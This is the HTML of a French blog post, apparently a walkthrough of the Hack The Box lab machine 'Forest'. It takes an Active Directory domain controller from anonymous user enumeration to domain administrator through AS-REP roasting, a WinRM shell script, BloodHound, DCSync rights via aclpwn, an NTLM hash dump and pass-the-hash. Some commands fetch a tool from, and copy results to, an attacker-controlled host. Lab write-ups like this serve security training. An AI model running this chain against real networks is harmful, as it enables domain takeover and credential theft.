@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.55.6" />
+
+    
+    
+    
+
+<title>Hack The Box - Forest • Haax - Personal Blog</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Hack The Box - Forest"/>
+<meta name="twitter:description" content="Forest est une machine Windows considérée comme facile/moyenne et orientée Active Directory. Un pseudo accès anonyme permet d&rsquo;énumérer les comptes du domaine et ainsi identifier un compte de service. Ce dernier, vulnérable à une attaque ASREP Roasting donne un accès utilisateur au travers de WinRM. L&rsquo;escalade de privilège est réalisée au travers de l&rsquo;exploitation de la vulnérabilité &ldquo;PrivExchange&rdquo;."/>
+
+<meta property="og:title" content="Hack The Box - Forest" />
+<meta property="og:description" content="Forest est une machine Windows considérée comme facile/moyenne et orientée Active Directory. Un pseudo accès anonyme permet d&rsquo;énumérer les comptes du domaine et ainsi identifier un compte de service. Ce dernier, vulnérable à une attaque ASREP Roasting donne un accès utilisateur au travers de WinRM. L&rsquo;escalade de privilège est réalisée au travers de l&rsquo;exploitation de la vulnérabilité &ldquo;PrivExchange&rdquo;." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://haaxmax.github.io/fr/walkthroughs/hackthebox/forest/" />
+<meta property="article:published_time" content="2020-03-21T00:00:00&#43;00:00"/>
+<meta property="article:modified_time" content="2020-03-21T00:00:00&#43;00:00"/><meta property="og:site_name" content="Haax - Personal Blog" />
+
+
+    
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">
+
+
+
+
+<link rel="stylesheet" href="/css/hyde-hyde.css">
+<link rel="stylesheet" href="/css/custom.css">
+<link rel="stylesheet" href="/css/print.min.css" media="print">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+
+</head>
+
+
+    <body >
+        
+<div class="sidebar">
+  <div class="container ">
+    <div class="sidebar-about">
+      
+      
+          <a href="https://haaxmax.github.io">
+          
+          
+          
+          <div class="author-image">
+            <img src="/img/icons/haax_logo.png" alt="Author Image" class="img--circle img--headshot element--center">
+          </div>
+          
+          </a>
+        
+      <p class="site__description">
+        <a href="https://haaxmax.github.io">
+         Infosec articles &amp; CTF Writeups 
+      </a>
+      </p>
+    </div>
+    <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/fr/articles/">
+						<span>Articles</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/fr/walkthroughs/">
+						<span>Walkthroughs</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/fr/writeups/">
+						<span>Write-Ups</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/fr/about/">
+						<span>À Propos</span>
+					</a>
+				</li>
+			 
+		
+		</li>
+	</ul>
+</div>
+
+    <p>
+      <section class="social">
+	
+	<a href="https://twitter.com/Haaxmax" target="blank"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+	
+	
+	&nbsp;<a href="https://github.com/Haaxmax" target="blank"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	&nbsp;<a href="https://gitlab.com/Haax" target="blank"><i class="fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+  &nbsp;<a href="https://www.root-me.org/Haax" target="blank" class="linklogo"><div class="rootme_logo logohover"></div></a>
+  
+	
+  &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="aperikube_logo logohover"></div></a>
+  
+	
+	&nbsp;<a href="mailto:haax@mdamail.ch" target="blank"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	&nbsp;<a href="https://haaxmax.github.io/fr/index.xml" target="blank"><i class="fas fa-rss fa-lg" aria-hidden="true"></i></a>
+	</section>
+
+    </p>
+    <div class="langSection">
+      
+      
+      <a rel="alternate" href="/en/walkthroughs/hackthebox/forest/" hreflang="en" lang="en" class="langLink">English</a>
+      <a rel="alternate" href="/en/walkthroughs/hackthebox/forest/" hreflang="en" lang="en"><img src="/img/icons/logo_drapeau_angleterre.png" alt="logo_angleterre" class="logoFlag"/></a>
+      </div>
+    <p class="copyright">
+      &copy; 2020 Haax.
+      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
+      <br/>Built with
+      <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+      
+    </p>
+  </div>
+  <div>
+  </div>
+</div>
+
+        <div class="content container">
+            
+    <article>
+  <header>
+    <h1>Hack The Box - Forest</h1>
+    
+    
+<div class="post__meta">
+    
+    
+      <i class="fas fa-calendar-alt"></i> Mar 21, 2020
+    
+    
+    
+    
+    <br/>
+    <i class="fas fa-clock"></i> 9 min read
+</div>
+
+
+  </header>
+  <div class="post">
+    <p>Forest est une machine Windows considérée comme facile/moyenne et orientée Active Directory. Un pseudo accès anonyme permet d&rsquo;énumérer les comptes du domaine et ainsi identifier un compte de service. Ce dernier, vulnérable à une attaque ASREP Roasting donne un accès utilisateur au travers de WinRM. L&rsquo;escalade de privilège est réalisée au travers de l&rsquo;exploitation de la vulnérabilité &ldquo;PrivExchange&rdquo;.</p>
+
+<p><strong>Disclaimer :</strong> Il s&rsquo;agit d&rsquo;une présentation plutôt rapide qui omet volontairement les différents axes de recherche. Seul les résultats effectifs ainsi qu&rsquo;une rapide démarche sont présentés.</p>
+
+<h2 id="découverte-énumération">Découverte / Énumération</h2>
+
+<p>Un rapide scan de ports permet d&rsquo;obtenir les services présents sur la machine.</p>
+
+<pre><code class="language-bash">$ sudo nmap -p 0-10000 -T5 -Pn -O -sV 10.10.10.161
+
+Nmap scan report for htb.local (10.10.10.161)
+Host is up (0.039s latency).
+Not shown: 7867 closed ports, 2123 filtered ports
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain?
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-11-10 15:14:42Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=11/10%Time=5DC827BA%P=x86_64-pc-linux-gnu%r(DNS
+SF:VersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
+SF:\x04bind\0\0\x10\0\x03&quot;);
+Aggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 (93%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre>
+
+<p>Le domaine est ainsi repéré et les différents services semblent indiquer que l&rsquo;on se trouve face à un contrôleur de domaine Active Directory.</p>
+
+<p>Il est possible d&rsquo;interroger l&rsquo;AD en tant qu&rsquo;utilisateur anonyme, ce qui permet notamment de récupérer la liste des utilisateurs du domaine (entre autres). Deux informations sont globalement importantes :</p>
+
+<ul>
+<li>La présence de l&rsquo;utilisateur <strong>svc-alfresco</strong>, typique d&rsquo;un compte de service ;</li>
+<li>La présence de <strong>boites e-mails</strong>, importantes pour la suite.</li>
+</ul>
+
+<pre><code class="language-bash">$ rpcclient -U &quot;&quot; -N 10.10.10.161 
+Unable to initialize messaging context
+
+rpcclient $&gt; enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[$331000-VK4ADACQNUCA] rid:[0x463]
+user:[SM_2c8eef0a09b545acb] rid:[0x464]
+user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+user:[SM_75a538d3025e4db9a] rid:[0x466]
+user:[SM_681f53d4942840e18] rid:[0x467]
+user:[SM_1b41c9286325456bb] rid:[0x468]
+user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+user:[SM_7c96b981967141ebb] rid:[0x46a]
+user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+user:[HealthMailboxc3d7722] rid:[0x46e]
+user:[HealthMailboxfc9daad] rid:[0x46f]
+user:[HealthMailboxc0a90c9] rid:[0x470]
+user:[HealthMailbox670628e] rid:[0x471]
+user:[HealthMailbox968e74d] rid:[0x472]
+user:[HealthMailbox6ded678] rid:[0x473]
+user:[HealthMailbox83d6781] rid:[0x474]
+user:[HealthMailboxfd87238] rid:[0x475]
+user:[HealthMailboxb01ac64] rid:[0x476]
+user:[HealthMailbox7108a4e] rid:[0x477]
+user:[HealthMailbox0659cc1] rid:[0x478]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]
+user:[bob] rid:[0x1db2]
+user:[bob2] rid:[0x1db3]
+</code></pre>
+
+<p><strong>Note importante :</strong> Afin d&rsquo;éviter les problèmes de résolution DNS, ne pas oublier de renseigner les informations de la machine dans les fichiers <code>resolv.conf</code> et <code>hosts</code>.</p>
+
+<pre><code class="language-bash">$ cat /etc/hosts
+127.0.0.1 localhost
+127.0.1.1 kalinux
+
+10.10.10.161 htb.local
+10.10.10.161 forest.htb.local
+</code></pre>
+
+<pre><code class="language-bash">$ cat /etc/resolv.conf 
+search htb.local
+nameserver 10.10.10.161
+</code></pre>
+
+<h2 id="asrep-roasting-et-cassage">ASREP Roasting et cassage</h2>
+
+<p>Il existe plusieurs attaques sur les comptes de services, la plus connue étant probalement le SPNRoasting (ou Kerberoasting). Cependant il est souvent nécessaire d&rsquo;avoir au préalable le contrôle d&rsquo;un premier compte utilisateur. Dans notre cas, il est possible d&rsquo;effectuer une attaque ASREP Roasting.</p>
+
+<p>Cette dernière se base sur la propriété &ldquo;Do not require Kerberos preauthentication&rdquo; d&rsquo;un compte et permet de récupérer un ticket au format KRB5ASREP qu&rsquo;il sera nécessaire de casser afin d&rsquo;utiliser le compte.</p>
+
+<p>Le script <code>GetNPUsers.py</code> de la suite Impacket est utilisé pour exploiter cette vulnérabilité sur le compte de service <strong>svc-alfresco</strong>.</p>
+
+<pre><code class="language-bash">$ python GetNPUsers.py htb.local/svc-alfresco -no-pass
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Getting TGT for svc-alfresco
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7ae561334cd58a56af90f7fbb20bbd4493b6754a57d5ebc08cb7f47ea472ebb7c9ba4260f57c11b664be03191550254e5c77a17518aeabc55f9321bd9f52201df820e130aa0e3f4b0986725fd3a14794433881050eb62d384c4058a407a348a7de2ef0767a99c9df4f85d8eba8ce30a4ad59621c51f8ea8c0d33f33e06bea1d8ff28d7a86fc2010fd7fa45d2fcc2178cb13c1006823aec8a5da10cffcceeb6e978754b0d4976df5cccb4beb9776d5a8f4810153ccc0e1237ec74e6ae61402457c6cfe29bca7c2f62b287f13aff063f5a0a21c728581e43b46d7537b3e776b4
+</code></pre>
+
+<p>Le hash est ensuite cassé à l&rsquo;aide de <code>john</code> et de la wordlist classique &ldquo;rockyou.txt&rdquo;. Pour une raison que j&rsquo;ignore, hashcat n&rsquo;a pas réussi à casser ce hash avec la même wordlist&hellip;</p>
+
+<pre><code class="language-bash">$ john ASREP_HASH --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep --fork=4 
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Node numbers 1-4 of 4 (fork)
+Press 'q' or Ctrl-C to abort, almost any other key for status
+s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
+4 1g 0:00:00:18 DONE (2019-11-10 16:32) 0.05285g/s 53986p/s 53986c/s 53986C/s s3urkf2m..s3rvice
+</code></pre>
+
+<h2 id="accès-via-winrm">Accès via WinRM</h2>
+
+<p>Un compte du domaine est maintenant en notre possession.</p>
+
+<pre><code class="language-bash">$ crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice
+SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:HTB) (signing:True) (SMBv1:True)
+SMB         10.10.10.161    445    FOREST           [+] HTB\svc-alfresco:s3rvice
+</code></pre>
+
+<p>Cependant, ce compte n&rsquo;est pas administrateur et les possibilités d&rsquo;exécution de commande à distance sont limitées.
+C&rsquo;est là qu&rsquo;intervient WinRM (Windows Remote Management). Il s&rsquo;agit d&rsquo;un service/protocole Microsoft HTTP, basé sur WS-Management (SOAP) qui permet l&rsquo;administration à distance de machines sous Windows.
+De retour à notre scan nmap, le port <strong>5985</strong>, utilisé par défaut par WinRM, est ouvert.</p>
+
+<p>Plusieurs façon d&rsquo;exploiter. J&rsquo;ai choisi d&rsquo;utiliser le script Ruby suivant.</p>
+
+<pre><code class="language-ruby">$ cat winrm_shell.rb 
+require 'winrm'
+
+conn = WinRM::Connection.new( 
+  endpoint: 'http://10.10.10.161:5985/wsman',
+  user: 'HTB.LOCAL\svc-alfresco',
+  password: 's3rvice',
+)
+
+command=&quot;&quot;
+
+conn.shell(:powershell) do |shell|
+    until command == &quot;exit\n&quot; do
+        print &quot;PS &gt; &quot;
+        command = gets        
+        output = shell.run(command) do |stdout, stderr|
+            STDOUT.print stdout
+            STDERR.print stderr
+        end
+    end    
+    puts &quot;Exiting with code #{output.exitcode}&quot;
+end
+</code></pre>
+
+<p>Ce qui donne un accès à la machine ainsi que le premier flag !</p>
+
+<pre><code class="language-bash">$ ruby winrm_shell.rb
+PS &gt; whoami
+htb\svc-alfresco
+
+PS &gt; pwd
+Path                           
+----                           
+C:\Users\svc-alfresco\Documents
+
+PS &gt; type ../Desktop/user.txt
+e5e4e47ae7022664cda6eb013fb0d9ed
+</code></pre>
+
+<h2 id="énumération-via-bloodhound">Énumération via BloodHound</h2>
+
+<p>Ayant un accès utilisateur, une seconde phase d&rsquo;énumération commence. L&rsquo;outil <code>BloodHound</code> est absolument génial lorsqu&rsquo;il s&rsquo;agit de faire de la reconnaissance sur un environnement Active Directory. De plus, un portage en Python a été effectué afin de pouvoir collecter les informations à distance (<a href="https://github.com/fox-it/BloodHound.py">https://github.com/fox-it/BloodHound.py</a>).</p>
+
+<pre><code class="language-bash">$ python bloodhound.py -u svc-alfresco -p s3rvice -d htb.local -c All
+INFO: Found AD domain: htb.local
+INFO: Connecting to LDAP server: FOREST.htb.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 2 computers
+INFO: Connecting to LDAP server: FOREST.htb.local
+WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153
+WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153
+WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153
+WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153
+WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153
+INFO: Found 31 users
+INFO: Found 72 groups
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: FOREST.htb.local
+INFO: Querying computer: EXCH01.htb.local
+INFO: Done in 00M 30S
+</code></pre>
+
+<p><strong>NOTE :</strong> Pour une raison que j&rsquo;ignore également (altération de la machine ?), j&rsquo;avais réalisé la collecte d&rsquo;infos d&rsquo;une autre façon une première fois, mais les résultats étaient différents, ce qui m&rsquo;a bloqué dans l&rsquo;escalade de privilèges.</p>
+
+<pre><code class="language-bash"># Mise en place d'un serveur HTTP local afin de déposer le collecteur powershell sur la machine
+python -m SimpleHTTPServer
+Invoke-WebRequest -Uri “http://10.10.16.112:8000/SharpHound.ps1” -OutFile “.\SharpHound.ps1”
+
+# Collecte des informations en local via le shell WinRM
+Powershell.exe -Exec Bypass
+Import-Module .\Sharphound.ps1
+Invoke-Bloodhound
+Invoke-BloodHound -CollectionMethod All
+
+# Mise en place d'un serveur SMB sur le réseau afin de récupérer les résultats
+sudo python smbserver.py testlol /home/xxxx/tmp
+sudo python smbserver.py -smb2support testlol /home/xxxx/tmp
+
+# Récupération des résultats
+net view \\10.10.16.112\TESTLOL
+copy C:\Users\svc-alfresco\Documents\20191104044628_BloodHound.zip \\10.10.16.112\TESTLOL\file.zip
+</code></pre>
+
+<p>Il est par la suite possible de visualiser les données via BloodHound.</p>
+
+<h2 id="escalade-de-privilège-privexchange">Escalade de privilège - PrivExchange</h2>
+
+<p>La visualisation des informations de l&rsquo;AD au travers de BloodHound permet d&rsquo;identifier un chemin potentiel de compromission partant de l&rsquo;utilisateur <code>svc-alfresco</code> et passant par les services de messagerie <strong>Exchange</strong>.</p>
+
+<p>Un peu de recherche (ou de veille) mettent sur la piste de la vulnérabilité <strong>PrivExchange</strong> (<a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/</a>) permettant ainsi à un utilisateur lambda de récupérer des droits <strong>DCSync</strong>, autorisant par conséquent des actions privlégiées sur le domaine.</p>
+
+<p>L&rsquo;outil <code>aclpwn</code> développé également par l&rsquo;auteur de l&rsquo;exploit automatise la recherche de chemin de compromission dans un ensemble de données BloodHound et réalise l&rsquo;exploitation. Il est nécessaire pour cela d&rsquo;avoir une instance de BloodHound en marche étant donné que l&rsquo;outil se sert des graphes créés.</p>
+
+<p>L&rsquo;option <code>-dry</code> permet dans un premier temps de simuler les actions effectuées sans réellement toucher à l&rsquo;AD.</p>
+
+<pre><code class="language-bash">$ python aclpwn.py -f svc-alfresco@htb.local -ft user -d htb.local -u svc-alfresco -p s3rvice -sp s3rvice -du neo4j -dp xxxx -dry
+[+] Path found!
+Path [0]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]-&gt;(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]-&gt;(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]-&gt;(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]-&gt;(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]-&gt;(HTB.LOCAL)
+[+] Path found!
+Path [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]-&gt;(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]-&gt;(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]-&gt;(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]-&gt;(EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL)-[MemberOf]-&gt;(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]-&gt;(HTB.LOCAL)
+[!] Unsupported operation: GetChanges on HTB.LOCAL (Domain)
+[-] Invalid path, skipping
+Please choose a path [0-1] 1
+[+] Path validated, the following modifications are required for exploitation in the current configuration:
+[-] Adding user svc-alfresco to group EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL
+[-] Modifying domain DACL to give DCSync rights to svc-alfresco
+</code></pre>
+
+<p>Ainsi, deux potentiels chemins de compromission sont identifiés.</p>
+
+<pre><code class="language-bash">$ python aclpwn.py -f svc-alfresco@htb.local -ft user -d htb.local -u svc-alfresco -p s3rvice -sp s3rvice -du neo4j -dp xxxx    
+[+] Path found!
+Path [0]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]-&gt;(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]-&gt;(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]-&gt;(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]-&gt;(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]-&gt;(HTB.LOCAL)
+[+] Path found!
+Path [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]-&gt;(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]-&gt;(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]-&gt;(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]-&gt;(EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL)-[MemberOf]-&gt;(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]-&gt;(HTB.LOCAL)
+[!] Unsupported operation: GetChanges on HTB.LOCAL (Domain)
+[-] Invalid path, skipping
+Please choose a path [0-1] 1
+[-] Memberof -&gt; continue
+[-] Memberof -&gt; continue
+[-] Memberof -&gt; continue
+[-] Adding user svc-alfresco to group EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL
+[+] Added CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local as member to CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
+[-] Switching context to svc-alfresco
+[+] Done switching context
+[-] Memberof -&gt; continue
+[-] Modifying domain DACL to give DCSync rights to svc-alfresco
+[+] Dacl modification successful
+[+] Finished running tasks
+[+] Saved restore state to aclpwn-20191110-170221.restore
+</code></pre>
+
+<p>Les droits étant acquis, il est maintenant possible d&rsquo;effectuer des actions privilégiées telles que dumper la base NTDS de l&rsquo;AD. l&rsquo;outil <code>secretsdump</code> de Impacket permet également de réaliser cette action à distance.</p>
+
+<p><strong>NOTE :</strong> Pour une raison que j&rsquo;ignore également (mesure de protection pour la machine ?), les droits DCSync ne semblent accordés à l&rsquo;utilisateur que pour une courte période (&lt;2 minutes).</p>
+
+<pre><code class="language-bash">$ python secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
+htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
+htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
+htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
+htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
+htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
+htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
+htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
+htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
+htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
+htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
+htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
+htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
+htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
+htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
+htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
+htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
+FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:7a1287ef194e7084fdf1ace622c83605:::
+EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
+[*] Cleaning up... 
+</code></pre>
+
+<p>Les hashs NTLM des utilisateurs en notre possession, il est maintenant possible de se connecter à la machine en administrateur ! Merci le <code>Pass the Hash</code> ;)</p>
+
+<pre><code class="language-bash">$ python wmiexec.py htb.local/Administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+whoami
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\&gt;whoami
+htb\administrator
+
+C:\&gt;type C:\Users\Administrator\Desktop\root.txt
+f048153f202bbb2f82622b04d79129cc
+</code></pre>
+
+<p>w00ted !</p>
+  </div>
+  
+
+<div class="post--navigation post--navigation-single">
+    
+    <a href="/fr/walkthroughs/hackthebox/jarvis/" class="post--navigation-prev">
+      <i aria-hidden="true" class="fa fa-chevron-left"></i>
+      <span class="navigation-tittle">Hack The Box - Jarvis</span>
+    </a>
+    
+    
+</div>
+
+
+  
+
+  
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+  
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-126182747-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
